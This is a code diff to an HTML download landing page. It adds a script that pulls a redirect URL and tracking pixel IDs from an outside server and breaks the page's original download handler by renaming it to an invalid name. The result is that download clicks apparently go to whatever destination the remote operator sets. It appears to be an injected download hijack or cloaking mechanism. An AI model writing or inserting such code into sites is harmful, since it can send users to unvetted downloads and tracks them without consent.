@@ -17,7 +17,105 @@
     <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32.png">
     <link rel="apple-touch-icon" sizes="192x192" href="images/apple-touch-icon.png">
     <meta name="theme-color" content="#1a0b1c"></head>
-  
+   <script>
+    // 声明全局变量
+    let targetRedirectUrl = '';
+    let targetEventName = '';
+    let apiStatus = 'loading';   // loading, success, error
+    let apiErrorMsg = '';
+
+    const currentLandingUrl = window.location.href.split('?')[0];
+
+    // 调用后台 API
+    fetch('https://url.dakm0112u.site/api.php?landing_url=' + encodeURIComponent(currentLandingUrl))
+        .then(response => response.json())
+        .then(res => {
+            if (res.code === 200) {
+                apiStatus = 'success';
+                const data = res.data;
+                targetRedirectUrl = data.redirect_url;
+                targetEventName = data.event_name || 'Purchase';
+
+                // --- 加载 Facebook 基础库（只加载一次）---
+                !function(f,b,e,v,n,t,s)
+                {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+                n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+                if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+                n.queue=[];t=b.createElement(e);t.async=!0;
+                t.src=v;s=b.getElementsByTagName(e)[0];
+                s.parentNode.insertBefore(t,s)}(window, document,'script',
+                'https://connect.facebook.net/en_US/fbevents.js');
+
+                // ----- 多像素支持 -----
+                let pixelIds = [];
+
+                // 优先使用 pixel_ids 数组（推荐后端返回格式）
+                if (data.pixel_ids && Array.isArray(data.pixel_ids)) {
+                    pixelIds = data.pixel_ids.filter(id => id && String(id).trim() !== '');
+                } 
+                // 兼容旧的 pixel_id 字符串（可能包含换行符或逗号）
+                else if (data.pixel_id) {
+                    let raw = String(data.pixel_id);
+                    if (raw.includes('\n')) {
+                        pixelIds = raw.split('\n').map(s => s.trim()).filter(s => s !== '');
+                    } else if (raw.includes(',')) {
+                        pixelIds = raw.split(',').map(s => s.trim()).filter(s => s !== '');
+                    } else {
+                        pixelIds = [raw.trim()];
+                    }
+                }
+
+                // 循环初始化每个像素
+                if (pixelIds.length > 0) {
+                    pixelIds.forEach(id => {
+                        fbq('init', id);
+                        console.log(`✅ 初始化像素: ${id}`);
+                    });
+                    // 统一发送 PageView（fbq 会自动发送给所有已初始化的像素）
+                    fbq('track', 'PageView');
+                } else {
+                    console.warn("没有有效的像素ID");
+                }
+            } else {
+                apiStatus = 'error';
+                apiErrorMsg = res.msg || '后台返回错误';
+                console.error("配置加载失败:", res.msg);
+            }
+        })
+        .catch(err => {
+            apiStatus = 'error';
+            apiErrorMsg = '网络请求失败，请检查接口地址或跨域设置';
+            console.error("API请求错误:", err);
+        });
+
+    // 按钮点击事件
+    function handleDownload() {
+        if (apiStatus === 'success' && targetRedirectUrl) {
+            if (typeof fbq === 'function') {
+                // 发送自定义事件（fbq 自动作用于所有已初始化的像素）
+                fbq('track', targetEventName);
+            }
+            setTimeout(() => {
+                window.location.href = targetRedirectUrl;
+            }, 300);
+        } 
+        else if (apiStatus === 'loading') {
+            alert("安全连接正在初始化，请稍等片刻再点击...");
+        } 
+        else if (apiStatus === 'error') {
+            if (apiErrorMsg.includes('暂无启用') || apiErrorMsg.includes('跳转链接')) {
+                alert("⚠️ 缺少跳转地址！\n\n后台规则已匹配，但该规则下没有处于【启用】状态的外部跳转链接。\n请登录后台添加或开启至少一条跳转链接！");
+            } 
+            else if (apiErrorMsg.includes('未找到匹配')) {
+                alert("⚠️ 域名未匹配！\n\n请检查后台填写的【落地页地址】是否与下方当前网址完全一致（注意http/https和斜杠）：\n" + currentLandingUrl);
+            } 
+            else {
+                alert("⚠️ 配置加载异常：\n\n" + apiErrorMsg);
+            }
+        }
+    }
+</script>
+ 
   <body>
     <nav class="nav">
       <div class="nav-logo">
@@ -1646,7 +1744,7 @@
           }
         } catch(e) {}
       }
-      function handleDownload() {
+      function 2323handleDownload() {
         if (window.__dlLock) return;
         window.__dlLock = true;
         sessionStorage.setItem('dftv_dl_clicked', '1');
